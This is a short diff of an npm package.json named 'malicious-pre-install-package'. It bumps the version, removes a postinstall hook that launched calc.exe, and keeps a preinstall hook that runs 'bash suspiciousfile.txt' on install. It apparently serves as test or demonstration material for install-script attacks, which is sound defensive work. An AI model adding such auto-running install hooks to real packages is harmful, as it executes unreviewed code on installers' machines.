@@ -1,11 +1,10 @@
 {
   "name": "malicious-pre-install-package",
-  "version": "1.0.0",
+  "version": "1.0.1",
   "description": "",
   "main": "index.js",
   "scripts": {
     "preinstall": "bash suspiciousfile.txt",
-    "postinstall": "calc.exe",
     "test": "echo \"Error: no test specified\" && exit 1"
   },
   "repository": {
